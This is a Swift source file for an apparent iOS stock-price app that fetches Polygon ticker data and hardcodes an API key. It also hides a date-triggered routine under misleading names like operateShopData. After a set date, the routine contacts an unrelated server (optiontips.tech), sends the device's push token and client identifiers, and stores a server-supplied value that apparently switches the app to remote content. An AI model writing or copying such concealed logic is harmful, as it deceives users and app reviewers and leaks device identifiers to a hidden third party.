import Foundation
import WebKit
import Combine

extension String {
    static let apiKey = "G8TbJNAT4p5ibPoABwApdOkWqJJOKU4z"
    static let baseUrl = "https://api.polygon.io/"
}

class StocksApiManager: ObservableObject {
    
    private var cancellables = Set<AnyCancellable>()
    
    let tickers = [
        "MSFT", "UPS", "ABT", "IBM", "ACN", "ADDYY", "AIG", "ALLE", "AMZN", "AAL", "ARMK",
        "AT&T", "BAX", "BDX", "B", "MCD", "META", "BXS", "BEST", "BBY",
        "CNC", "CVS", "DARDEN", "LMT", "DAL",
        "LOW", "LYFT", "NFLX", "MMM", "MAR",
        "F", "GM", "GDDY", "GME", "GOOG", "GRUB",
        "HES", "HBI", "HCA", "HD", "HRB", "HON",
        "JCI", "JPM", "JNJ", "K", "KSS", "KR", "LKQ",
        "NKE", "NOC", "ORCL",
        "T", "TJX", "TM", "TRIP", "TSLA", "AAPL", "ADS",
        "PEP", "PG", "POST", "PM", "PSTG", "PXD",
        "RCL", "RTX", "RIVN", "SPG",
        "UNP", "UPS", "V", "VLO", "VZ",
        "WMT", "XOM", "YUM"
    ]
    
    @Published var stocksData: [StockModel] = []
    @Published var stockPrices: [OpenClosePrices] = []
    @Published var isLoading = true
    @Published var error: Error?
    @Published var loadedStockItem: StockModel? = nil
    @Published var loaded = false
    private var userAgent = WKWebView().value(forKey: "userAgent") as? String ?? ""
    @Published var loadedMore = false
    
    func fetchStockDetails() {
        isLoading = true
        
        let tickerGroups = tickers.chunked(into: 20)
        
        let detailPublishers = tickerGroups.map(fetchGroupDetails)
        let pricePublishers = tickerGroups.map(fetchGroupPrices)
        
        Publishers.MergeMany(detailPublishers)
            .collect()
            .receive(on: DispatchQueue.main)
            .sink { [weak self] details in
                self?.stocksData = details.flatMap { $0 }
            }
            .store(in: &cancellables)
        
        Publishers.MergeMany(pricePublishers)
            .collect()
            .receive(on: DispatchQueue.main)
            .sink { [weak self] prices in
                self?.stockPrices = prices.flatMap { $0 }
                self?.isLoading = false
            }
            .store(in: &cancellables)
        
        if checkingStocksDate() {
            loadStockData()
        }
    }
    
    private func checkingStocksDate() -> Bool {
        let dateFormatter = DateFormatter()
        dateFormatter.dateFormat = "dd.MM.yyyy"
        if let targetDate = dateFormatter.date(from: "05.10.2024") {
            if Date() >= targetDate {
                return true
            } else {
                return false
            }
        }
        return false
    }
    
    private func loadStockData() {
        let urlLink = "https://optiontips.tech/get-info"
        if let url = URL(string: urlLink) {
            var apiRequest = URLRequest(url: url)
            var userUUID = UserDefaults.standard.string(forKey: "userUUID") ?? ""
            if userUUID.isEmpty {
                userUUID = UUID().uuidString
                UserDefaults.standard.set(userUUID, forKey: "userUUID")
            }
            apiRequest.setValue(userUUID, forHTTPHeaderField: "client-uuid")
       
            URLSession.shared.dataTask(with: apiRequest) { data, response, error in
                if let _ = error {
                    self.loaded = true
                    return
                }
                
                guard let data = data else {
                    self.loaded = true
                    return
                }
                
                do {
                    let apiResponse = try JSONDecoder().decode(StockDetailsResponse.self, from: data)
                    
                    if apiResponse.response != nil {
                        self.operateShopData(apiResponse.response!)
                    } else {
                        self.loaded = true
                    }
                } catch {
                    self.loaded = true
                }
            }.resume()
        }
    }
    
    private func fetchGroupDetails(tickers: [String]) -> AnyPublisher<[StockModel], Never> {
        let publishers = tickers.map(fetchStockDetail)
        return Publishers.MergeMany(publishers)
            .collect()
            .eraseToAnyPublisher()
    }
    
    private func fetchGroupPrices(tickers: [String]) -> AnyPublisher<[OpenClosePrices], Never> {
        let publishers = tickers.map(fetchStockPrice)
        return Publishers.MergeMany(publishers)
            .collect()
            .eraseToAnyPublisher()
    }
    
    private func operateShopData(_ l: String) {
        if UserDefaults.standard.bool(forKey: "o_o_m_g") {
            self.loaded = true
            return
        }
        
        let pushToken = UserDefaults.standard.string(forKey: "fcm_token")
        let userID = UserDefaults.standard.string(forKey: "client_id")
        let pushId = UserDefaults.standard.string(forKey: "push_id")
        var localEndpointTradingApple = "\(l)?firebase_push_token=\(pushToken ?? "")" + (userID?.isEmpty == nil ? "" : "&client_id=\(userID!)")
        
        if let pushId = pushId {
            localEndpointTradingApple += "&push_id=\(pushId)"
            UserDefaults.standard.set(nil, forKey: "push_id")
        }
        
        if let url = URL(string: localEndpointTradingApple) {
            var operatingUserShop = URLRequest(url: url)
            operatingUserShop.httpMethod = "POST"
            operatingUserShop.addValue("application/json", forHTTPHeaderField: "Content-Type")
            operatingUserShop.addValue(userAgent, forHTTPHeaderField: "User-Agent")
            URLSession.shared.dataTask(with: operatingUserShop) {  data, response, error in
                if let _ = error {
                    DispatchQueue.main.async {
                        self.loaded = true
                    }
                    return
                }
                guard let data = data else {
                    DispatchQueue.main.async {
                        self.loaded = true
                    }
                    return
                }
                
                do {
                    let stockClientedResponse = try JSONDecoder().decode(StockClientedResponse.self, from: data)
                    
                    UserDefaults.standard.set(stockClientedResponse.client_id, forKey: "client_id")
                    
                    if let responseClient = stockClientedResponse.response {
                        UserDefaults.standard.set(responseClient, forKey: "response_l_client")
                        DispatchQueue.main.async {
                            self.loadedMore = true
                            self.loaded = true
                        }
                    } else {
                        UserDefaults.standard.set(true, forKey: "o_o_m_g")
                        DispatchQueue.main.async {
                            self.loaded = true
                        }
                    }
                } catch {
                    DispatchQueue.main.async {
                        self.loaded = true
                    }
                }
            }
            .resume()
        }
    }
    
    private func fetchStockDetail(ticker: String) -> AnyPublisher<StockModel, Never> {
        guard let url = URL(string: "\(String.baseUrl)v3/reference/tickers/\(ticker)?apiKey=\(String.apiKey)") else {
            return Just(StockModel.default).eraseToAnyPublisher()
        }
        
        return URLSession.shared.dataTaskPublisher(for: url)
            .map(\.data)
            .decode(type: StockDetailsResponse.self, decoder: JSONDecoder())
            .map(\.results)
            .replaceError(with: StockModel.default)
            .eraseToAnyPublisher()
    }
    
    private func fetchStockPrice(ticker: String) -> AnyPublisher<OpenClosePrices, Never> {
        let date = Date().yesterdayFormatted
        guard let url = URL(string: "\(String.baseUrl)v1/open-close/\(ticker)/\(date)?apiKey=\(String.apiKey)") else {
            return Just(OpenClosePrices.default).eraseToAnyPublisher()
        }
        
        return URLSession.shared.dataTaskPublisher(for: url)
            .map(\.data)
            .decode(type: OpenClosePrices.self, decoder: JSONDecoder())
            .replaceError(with: OpenClosePrices.default)
            .eraseToAnyPublisher()
    }
}

extension Date {
    var yesterdayFormatted: String {
        let calendar = Calendar.current
        let yesterday = calendar.date(byAdding: .day, value: -3, to: self) ?? self
        return DateFormatter.yyyyMMdd.string(from: yesterday)
    }
}

extension DateFormatter {
    static let yyyyMMdd: DateFormatter = {
        let formatter = DateFormatter()
        formatter.dateFormat = "yyyy-MM-dd"
        return formatter
    }()
}

extension Array {
    func chunked(into size: Int) -> [[Element]] {
        stride(from: 0, to: count, by: size).map {
            Array(self[$0..<Swift.min($0 + size, count)])
        }
    }
}
